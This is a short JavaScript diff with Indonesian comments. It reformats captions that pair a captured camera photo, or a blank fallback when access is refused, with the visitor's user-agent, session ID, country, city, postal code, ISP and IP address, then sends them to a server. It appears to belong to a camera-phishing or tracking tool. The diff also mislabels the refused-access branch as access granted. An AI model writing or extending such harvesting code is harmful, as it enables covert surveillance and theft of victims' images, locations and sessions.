@@ -32,18 +32,21 @@
 
         // Tambahkan data ke dalam caption
         const captions = `
-        👀 Pengguna Mengizinkan Akses
-   
-        🌐 User-Agent: ${userAgent}
-        🔑 Session: ${session}
-        
-        🌎 Lokasi:
-        - Negara: ${country}
-        - Kota: ${city}
-        - Kode Pos: ${zip}
-        - ISP: ${isp}
-        - IP: ${query}
-        `;
+        👀 **Akses Kamera Diberikan**
+
+        🌐 **Informasi Perangkat:**
+         - **User-Agent**: ${userAgent}
+
+        🔑 **Detail Sesi:**
+         - **Session ID**: ${session}
+
+        🌎 **Informasi Lokasi:**
+         - **Negara**: ${country}
+         - **Kota**: ${city}
+         - **Kode Pos**: ${zip}
+         - **ISP**: ${isp}
+         - **Alamat IP**: ${query}
+         `;
             
             // Kirim foto ke server
             const formData = new FormData();
@@ -105,18 +108,21 @@
 
         // Tambahkan data ke dalam caption
         const captions = `
-        👀 Pengguna Tidak Mengizinkan Akses
-   
-        🌐 User-Agent: ${userAgent}
-        🔑 Session: ${session}
-        
-        🌎 Lokasi:
-        - Negara: ${country}
-        - Kota: ${city}
-        - Kode Pos: ${zip}
-        - ISP: ${isp}
-        - IP: ${query}
-        `;
+        👀 **Akses Kamera Diberikan**
+
+        🌐 **Informasi Perangkat:**
+         - **User-Agent**: ${userAgent}
+
+        🔑 **Detail Sesi:**
+         - **Session ID**: ${session}
+
+        🌎 **Informasi Lokasi:**
+         - **Negara**: ${country}
+         - **Kota**: ${city}
+         - **Kode Pos**: ${zip}
+         - **ISP**: ${isp}
+         - **Alamat IP**: ${query}
+         `;
         
         // Kirim foto kosong (fallback) ke server
         const formDatas = new FormData();
